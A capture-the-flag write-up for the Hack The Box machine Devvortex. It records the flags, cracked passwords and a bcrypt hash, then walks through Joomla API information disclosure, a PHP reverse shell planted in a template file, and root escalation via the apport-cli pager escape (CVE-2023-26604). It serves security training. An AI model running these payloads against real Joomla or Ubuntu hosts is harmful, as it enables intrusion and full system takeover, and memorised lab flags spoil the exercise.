## Flags
- User: a13860c3a296902796864d49178ffab9
- Root: 3ed95753ab0f053838066b377d450d6c
## Enumeration

### 1. Machine Overview
- **Operating System:** Linux
- **Discovered Users:**
  - `lewis : P4ntherg0t1n5r3c0n##`
  - `logan : tequieromucho`

---

### 2. Services
| Port | Protocol | Service | Version                         |
| ---: | -------- | ------- | ------------------------------- |
|   22 | TCP      | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 |
|   80 | TCP      | HTTP    | nginx 1.18.0 (Ubuntu)           |

---

### 3. Port 80 — HTTP (Main Site)

- The website belongs to a **web development agency**
- All web files end with `.html`
- Two forms are present on the main page:
  - Subscription form
  - Contact form
- Both forms have **no action attribute** and are static `.html` files, meaning they are non-functional

#### Directory Enumeration Results
```
images                  Status: 301
contact.html            Status: 200
index.html              Status: 200
about.html              Status: 200
css                     Status: 301
do.html                 Status: 200
portfolio.html          Status: 200
js                      Status: 301
```

- A subdomain named **`dev`** was discovered

---

## Virtual Host Enumeration

### 4. VHost `dev` — Port 80

- The virtual host is running **Joomla CMS**
- The following page triggers an error:
  - `http://dev.devvortex.htb/portfolio-details.html`
- Backend language is: **PHP**

#### Directory Listing
```
.git                    Status: 403
index.php               Status: 200
images                  Status: 200
home                    Status: 200
media                   Status: 200
templates               Status: 200
modules                 Status: 200
plugins                 Status: 200
includes                Status: 200
language                Status: 200
components              Status: 200
cache                   Status: 200
libraries               Status: 200
tmp                     Status: 200
layouts                 Status: 200
administrator           Status: 200 ***
configuration.php       Status: 200
web.config.txt
LICENSE.txt
README.txt
htaccess.txt
```

- Administrator panel found at:
  - `http://dev.devvortex.htb/administrator/`

#### robots.txt Contents
```
/administrator/
/api/
/bin/
/cache/
/cli/
/components/
/includes/
/installation/
/language/
/layouts/
/libraries/
/logs/
/modules/
/plugins/
/tmp/
```

---

### Joomla Details

- **Joomla Version:** 4.2.6
- Interesting file exposing metadata:
  - `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml`

---

### User Enumeration via Joomla API

Using the public API endpoint, existing users can be enumerated and privilege levels identified:

```bash
curl -s http://dev.devvortex.htb/api/v1/users?public=true | jq
```

```json
{
  "data": [
    {
      "attributes": {
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "group_names": "Super Users"
      }
    },
    {
      "attributes": {
        "username": "logan",
        "email": "logan@devvortex.htb",
        "group_names": "Registered"
      }
    }
  ]
}
```

- The user **`lewis`** is confirmed as a **Super User**

- Using the following endpoint:
  - `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`
- The **password for user `lewis`** was disclosed

---

## Exploitation

### Initial Foothold — `www-data`

- A PHP reverse shell payload was injected into a Joomla template file:
```php
$sock=fsockopen("<IP>",<PORT>);
$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

- Accessing the modified template yielded a shell as **`www-data`**

---

### Privilege Escalation — `www-data` to `logan`

- The local user is `logan`
- Using the database credentials of `lewis`, the password hash for `logan` was retrieved:
```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

- The hash was cracked, revealing the password:
```
tequieromucho
```

- SSH access as `logan` was obtained

---

## Privilege Escalation — User to Root

- As `logan`, the following sudo privilege was identified:
```bash
sudo /usr/bin/apport-cli -v
```

- **Apport version:** 2.20.11
- This version is vulnerable to **CVE-2023-26604**

---

### Exploiting Apport (CVE-2023-26604)

#### Sample Crash File
```text
ProblemType: Crash
Architecture: amd64
Date: Wed Jan 24 12:34:56 2026
DistroRelease: Ubuntu 22.04
ExecutablePath: /usr/bin/example-app
ExecutableTimestamp: 1670000000
ProcCmdline: /usr/bin/example-app --test
ProcCwd: /home/testuser
ProcEnviron:
 PATH=(custom, user)
 LANG=en_US.UTF-8
 SHELL=/bin/bash
Signal: 11
SignalName: SIGSEGV
CrashCounter: 1
```

#### Exploitation Steps
```bash
sudo /usr/bin/apport-cli -c file.crash
```

- Choose option **`V`** (View report)
- When prompted, enter:
```
!/bin/bash
```

- A **root shell** is obtained

---

## Root Access Achieved

✔ Full system compromise complete.
